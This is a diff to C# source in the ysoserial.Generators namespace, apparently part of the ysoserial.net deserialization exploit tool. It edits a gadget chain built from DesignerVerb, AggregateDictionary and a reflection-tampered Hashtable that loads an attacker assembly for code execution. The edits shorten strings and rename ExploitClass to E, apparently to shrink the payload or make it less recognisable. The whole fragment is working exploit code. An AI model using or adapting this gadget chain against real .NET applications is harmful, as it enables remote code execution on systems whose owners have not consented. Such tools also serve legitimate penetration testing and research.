@@ -34,7 +34,7 @@ namespace ysoserial.Generators
         protected byte[] assemblyBytes;
         public PayloadClass()
         {
-            this.assemblyBytes = File.ReadAllBytes(typeof(ExploitClass).Assembly.Location);
+            this.assemblyBytes = File.ReadAllBytes(typeof(E).Assembly.Location);
         }
 
         protected PayloadClass(SerializationInfo info, StreamingContext context)
@@ -61,7 +61,7 @@ namespace ysoserial.Generators
             IDictionary dict = (IDictionary)Activator.CreateInstance(typeof(int).Assembly.GetType("System.Runtime.Remoting.Channels.AggregateDictionary"), pds);
 
             // DesignerVerb queries a value from an IDictionary when its ToString is called. This results in the linq enumerator being walked.
-            DesignerVerb verb = new DesignerVerb("XYZ", null);
+            DesignerVerb verb = new DesignerVerb("", null);
             // Need to insert IDictionary using reflection.
             typeof(MenuCommand).GetField("properties", BindingFlags.NonPublic | BindingFlags.Instance).SetValue(verb, dict);
 
@@ -77,8 +77,12 @@ namespace ysoserial.Generators
             Hashtable ht = new Hashtable();
 
             // Add two entries to table.
+            /*
             ht.Add(verb, "Hello");
             ht.Add("Dummy", "Hello2");
+            */
+            ht.Add(verb, "");
+            ht.Add("", "");
 
             FieldInfo fi_keys = ht.GetType().GetField("buckets", BindingFlags.NonPublic | BindingFlags.Instance);
             Array keys = (Array)fi_keys.GetValue(ht);
